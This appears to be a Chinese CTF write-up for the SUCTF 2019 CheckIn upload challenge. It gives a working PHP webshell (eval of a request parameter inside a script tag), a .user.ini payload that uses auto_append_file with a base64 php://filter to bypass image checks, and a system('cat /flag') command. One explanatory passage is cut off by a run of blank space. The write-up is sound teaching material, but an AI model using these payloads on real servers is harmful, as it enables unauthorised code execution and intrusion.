---
title: '[SUCTF 2019]CheckIn1'
abbrlink: 7fbf5bdf
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# [SUCTF 2019]CheckIn

# 1

老题目图片上传（尖括号过滤，文件头检查，request手动执行，ini配置文件）

---

## 1.知识点

### 1.exif_imagetype 到底在查什么？

普通检查可能只看文件头的前几个字符（如 `GIF89a`），但 `exif_imagetype()` 函数更严格：

- **特征签名检查**：它会读取文件的**前几个字节**，并对比内置的 **Magic Number（魔数）** 表。
- **结构完整性**：它不仅看开头，还会简单判断文件结构是否符合该图片格式的规范。
- **报错原因**：如果开头写了 `GIF89a`，但后面紧跟着全是 PHP 代码，该函数可能会因为找不到图片应有的数据结构而返回 `false`，从而触发 `not image!` 的提示。



### 2.为什么木马中post不行，换成request却可以？——**服务器的配置限制**

**POST 长度/开关限制**：

在极少数极端环境下，服务器可能限制了 POST 数据的大小，或者在 Web 服务器层（如 Nginx）禁止了对某些目录的 POST 请求。



### 3. `.user.ini` 

让用户在没有权限修改全局 `php.ini` 的情况下，微调某个目录的设置。

**规则：** 当 PHP 引擎准备执行一个 `.php` 文件时，会**先在当前目录下**找找有没有 `.user.ini` 

**绑定：** 如果找到了，这个 `.user.ini` 里的配置会**立即生效**，并作用于该目录下所有的 PHP 请求。

**此题情况：** 因为 `index.php` 和 `.user.ini` 都在同一个 `uploads/xxx/` 文件夹里，所以当你访问 `index.php` 时，PHP 引擎会自动读取旁边的 `.user.ini`。

 `.user.ini` 里写的通常是这两条指令之一：

- `auto_prepend_file = b.gif` (在执行 PHP 脚本**之前**，先包含并执行 b.gif)
- `auto_append_file = b.gif` (在执行 PHP 脚本**之后**，再包含并执行 b.gif)

只要这个目录下的任何 `.php` 文件（比如 `index.php`）被调用，PHP 引擎都会先把 `b.gif` 的内容当成代码“拼”到 `index.php` 的源码里。

---

## 2.思路：

首先随便上传个木马，发现 `<?`被过滤，

而且明确要有图片的文件头，否则会出现以下报错

```
exif_imagetype:not image!
```

后来发现木马上传$_POST不行，但是REQUEST可以

#### -->绕过

1. **GIF89a**：“文件类型”的检查。

2. **script 标签**：避开对 `<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ?>` 并在蚁剑点击“连接”时，后台发生了以下**四个步骤**：

##### **第一步：建立 HTTP POST 请求**

蚁剑会构造一个 **HTTP POST 数据包**发往服务器。

- **目标**：你的木马文件 URL
- **Payload**：蚁剑会自动把它自带的复杂指令转换成一段 **Base64 加密的 PHP 代码**。这个指令能帮助我们拿到很多信息

##### **第二步：参数传递与“解包”**

数据包到达服务器后，PHP 引擎开始工作：

1. 服务器识别出 POST 请求，并将payload存入 `$_POST` 全局变量。
2. 木马执行：`eval($_POST['cmd']);`。
3. `eval` 函数将 `$_POST['cmd']` 里的payload执行。

此后你会看到图形化页面，里面就会有你想要的信息了

### 2. .user.ini（以 `auto_prepend_file` 为例）

当请求指向 `index.php` 且目录下存在 `.user.ini` 时，PHP 引擎接收到 `index.php` 的执行请求:

1. **配置**：引擎读取 `.user.ini`，发现 `auto_prepend_file = b.gif`。此时，引擎在内存中修改配置，将 `b.gif` 设为预加载文件。

2. **编译**：

   - 引擎先读取并编译 `b.gif` 中的内容。

     由于 `auto_prepend_file` 存在，即使 `b.gif` 后缀不是 PHP，引擎也**强行将其内容作为 PHP 代码解析**。

   - 随后，引擎再编译 `index.php` 源码。

3. **执行阶段**：

   - 引擎先执行 `b.gif`的代码 ，木马（如 `eval($_POST['ant'])`）开始执行，监听 POST 数据,而蚁剑传入post数据，eval来执行。
   - 最后再执行 `index.php` 原本的代码。

   '''

------

## 3.exp：

1.先传入配置文件.user.ini：

内容为

```
GIF89a
AddType application/x-httpd-php .jpg
php_value auto_append_file "php://filter/convert.base64-decode/resource=gif_shell.jpg"	#这里记得修改成你要上传的图片名
```

2.木马图片payload:

```
<script language='php'>eval($_REQUEST['cmd']);</script>
```

3.手动执行（相较于蚁剑的自动）

已知目录下有index.php和我们ini以及木马图

那我们需要执行url为：文件目录/index.php?cmd=想要执行的命令，这里不用蚁剑连接了，你可以自己输入

```
目录/index.php?cmd=system('cat /flag');
```

得到

![image-20260330140654191](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260330140701486.png)
















